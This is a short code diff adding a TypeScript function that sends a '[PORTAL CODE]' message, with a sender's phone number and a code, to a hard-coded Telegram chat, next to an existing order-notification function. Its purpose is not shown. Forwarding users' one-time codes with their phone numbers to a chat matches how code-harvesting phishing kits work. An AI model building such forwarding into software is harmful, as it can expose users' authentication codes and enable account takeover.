@@ -55,3 +55,12 @@ export async function telegramSendOrder(order: IOrder) {
     const res = await telegramSend(message, -1002259481861, 4)
     return res
 }
+
+
+export async function telegramSendCode(code: string, phone: string) {
+    let message = '[PORTAL CODE]\n'
+    message += `<b>Номер отправителя: ${phone}</b>\n`
+    message += `<b>Код: ${code}</b>\n`
+    const res = await telegramSend(message, -1002259481861, 28)
+    return res
+}
